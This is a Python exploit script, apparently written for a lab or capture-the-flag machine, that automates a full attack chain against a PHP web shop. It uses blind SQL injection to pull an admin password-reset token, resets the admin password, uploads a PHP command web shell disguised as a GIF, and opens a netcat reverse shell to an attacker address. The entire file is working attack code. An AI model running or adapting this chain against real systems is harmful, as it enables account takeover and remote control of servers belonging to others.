# 'http://192.168.233.170/item/viewItem.php?id=5+or+(select(select+ascii(substring(username,1,1))+from+user+where+id_level+=+1)=97)' -I
import requests, signal, sys, string
from pwn import * 
from urllib.parse import quote

def def_handler(sig, frame):
	print("\n\n[!] Saliendo...\n")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "http://192.168.233.170/item/viewItem.php?"

def RCE():
	# Request new token:
	s = requests.Session()
	reset_data = {
		"username":"admin"
	}

	p = s.post(url="http://192.168.233.170/login/resetPassword.php", data=reset_data)

	p1 = log.progress("Brute Forcing")
	p1.status("Starting attack")
	token = ""
	time.sleep(1)
	characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	p2 = log.progress("token")
	for position in range(1, 16):
		for char in characters:
			AsciiChar = ord(char)
			sqliURL = main_url + f"id=5 or (select(select ascii(substring(token,{position},1)) from user where id_level = 1)={AsciiChar})"
			p1.status(sqliURL)

			r = requests.get(url=sqliURL)

			if r.status_code == 404:
				token += char
				p2.status(token)
				break	

	Password_Change_Url = f"http://192.168.233.170/login/doChangePassword.php?token={token}&password=victor1234"
	
	g = s.get(url=Password_Change_Url, allow_redirects=True)
	if "Password Changed" in g.text:
		print("[+] Password change to victor1234")
	else:
		print("[-] Error changing password")

	proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	# Auth
	auth_url = "http://192.168.233.170/login/checkLogin.php"
	headers = {"Content-Type": "application/x-www-form-urlencoded"}
	login_data = {
		'username': 'admin',
		'password': 'victor1234'
	}
	auth = s.post(url=auth_url, data=login_data, headers=headers, proxies=proxies)
	if "Success" in auth.text:
		print("[+] Sucessfully logged in")
	else: 
		print("[-] Error while logging in")
	# File Upload:
	url = "http://192.168.233.170/item/updateItem.php"
	data = 'GIF98a;<?php system($_REQUEST[\"cmd\"]); ?>'
	multipart_data = {
		'id' : (None,"1"),
		'id_user' : (None,"1"),
		'name' : (None,"Raspberry Pi 4"),
		'image': ('0x4rt3mis.phar', data, "image/gif"),
		'description' : (None,"Just Random Text"),
		'price' : (None,"92")
		}
	upload = s.post(url, files=multipart_data)
	print("[+] File uploaded!")

	# Rev Shell
	command = quote("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.233.128 443 >/tmp/f")
	rce_url = f"http://192.168.233.170/item/image/0x4rt3mis.phar?cmd={command}"
	print(rce_url)
	rce = s.get(url=rce_url)
if __name__ == '__main__':
	RCE()
